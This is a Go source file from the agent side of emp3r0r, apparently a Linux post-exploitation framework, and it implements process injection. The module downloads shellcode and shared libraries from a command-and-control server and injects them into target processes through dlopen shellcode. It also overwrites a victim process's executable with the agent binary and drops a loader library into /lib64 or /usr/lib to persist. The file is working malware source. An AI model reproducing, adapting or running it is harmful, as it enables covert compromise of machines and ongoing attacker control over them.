//go:build linux
// +build linux

package modules

import (
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
	"github.com/jm33-m0/emp3r0r/core/lib/external_file"
	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// copy agent binary and loader.so to persistent location
func prepare_loader_so(pid int, bin string) (so_path string, err error) {
	// only supports x86_64
	if runtime.GOARCH != "amd64" {
		return "", fmt.Errorf("only supports x86_64")
	}

	so_path = fmt.Sprintf("/%s/%s",
		common.RuntimeConfig.UtilsPath, common.NameTheLibrary())
	if os.Geteuid() == 0 {
		so_path = fmt.Sprintf("/lib64/%s", common.NameTheLibrary())
	}
	if !util.IsFileExist(so_path) {
		out, err := external_file.ExtractFileFromString(external_file.LoaderSO_Data)
		if err != nil {
			return "", fmt.Errorf("extract loader.so failed: %v", err)
		}
		err = os.WriteFile(so_path, out, 0o644)
		if err != nil {
			return "", fmt.Errorf("write loader.so failed: %v", err)
		}
	}

	// see loader/elf/loader.c
	// make sure loader.so can find emp3r0r
	exe_file := util.ProcExePath(pid)
	if pid <= 0 && bin != "" {
		exe_file = bin
	}
	if !util.IsExist(exe_file) {
		return "", fmt.Errorf("target binary %s not found", exe_file)
	}
	agent_path := fmt.Sprintf("%s/_%s",
		util.ProcCwd(pid),
		util.FileBaseName(exe_file))
	err = CopySelfTo(agent_path)

	return
}

// prepare for guardian_shellcode injection, targeting pid
func prepare_guardian_sc(pid int) (shellcode string, err error) {
	// prepare guardian_shellcode
	proc_exe := util.ProcExePath(pid)
	// backup original binary
	err = util.CopyProcExeTo(pid, common.RuntimeConfig.AgentRoot+"/"+util.FileBaseName(proc_exe))
	if err != nil {
		return "", fmt.Errorf("failed to backup %s: %v", proc_exe, err)
	}
	err = CopySelfTo(proc_exe)
	if err != nil {
		return "", fmt.Errorf("failed to overwrite %s with emp3r0r: %v", proc_exe, err)
	}
	sc := gen_guardian_shellcode(proc_exe)

	if len(sc) == 0 {
		return "", fmt.Errorf("failed to generate guardian_shellcode")
	}

	return sc, nil
}

func prepare_shared_lib(checksum string) (path string, err error) {
	path = fmt.Sprintf("/usr/lib/%s", common.NameTheLibrary())
	if !sysinfo.HasRoot() {
		path = fmt.Sprintf("%s/%s", common.RuntimeConfig.UtilsPath, common.NameTheLibrary())
	}
	_, err = c2transport.SmartDownload("", "to_inject.so", path, checksum)
	if err != nil {
		err = fmt.Errorf("failed to download to_inject.so from CC: %v", err)
	}
	return
}

// prepare the shellcode
func prepare_sc(pid int, checksum string) (shellcode string, shellcodeLen int) {
	sc, err := c2transport.SmartDownload("", "shellcode.txt", "", checksum)
	if err != nil {
		log.Printf("Failed to download shellcode.txt from CC: %v", err)
		// prepare guardian_shellcode
		def.GuardianShellcode, err = prepare_guardian_sc(pid)
		if err != nil {
			log.Printf("Failed to prepare_guardian_sc: %v", err)
			return
		}
		sc = []byte(def.GuardianShellcode)
	}
	shellcode = string(sc)
	log.Printf("Collected shellcode: %s", shellcode)
	shellcodeLen = strings.Count(string(shellcode), "0x")
	if shellcodeLen == 0 {
		log.Printf("Failed to collect shellcode")
		return
	}
	log.Printf("Collected %d bytes of shellcode, preparing to inject", shellcodeLen)
	return
}

// InjectorHandler handles `injector` module
func InjectorHandler(pid int, method, checksum string) (err error) {
	// dispatch
	switch method {

	case "shellcode":
		shellcode, _ := prepare_sc(pid, checksum)
		if len(shellcode) == 0 {
			return fmt.Errorf("failed to prepare shellcode")
		}
		err = ShellcodeInjector(&shellcode, pid)
		if err != nil {
			return
		}

	case "shared_library":
		so_path, e := prepare_shared_lib(checksum)
		if e != nil {
			log.Printf("Injecting loader.so instead")
			err = InjectLoader(pid)
			return err
		}
		err = InjectSharedLib(so_path, pid)

	default:
		err = fmt.Errorf("%s is not supported", method)
	}
	return
}

// inject a shared library into target process
func InjectSharedLib(so_path string, pid int) (err error) {
	dlopen_addr, err := exe_utils.GetSymFromLibc(pid, "__libc_dlopen_mode")
	if err != nil {
		log.Printf("failed to get __libc_dlopen_mode address for %d: %v, trying `dlopen`", pid, err)
	}
	log.Printf("dlopen_addr: %v", dlopen_addr)
	dlopen_addr, err = exe_utils.GetSymFromLibc(pid, "dlopen")
	if err != nil {
		return fmt.Errorf("failed to get dlopen address for %d: %v", pid, err)
	}
	shellcode := gen_dlopen_shellcode(so_path, dlopen_addr)
	if len(shellcode) == 0 {
		return fmt.Errorf("failed to generate dlopen shellcode")
	}
	return ShellcodeInjector(&shellcode, pid)
}

// InjectLoader inject loader.so into any process, using shellcode
// locate __libc_dlopen_mode in memory then use it to load SO
func InjectLoader(pid int) error {
	so_path, err := prepare_loader_so(pid, "")
	if err != nil {
		return err
	}

	return InjectSharedLib(so_path, pid)
}
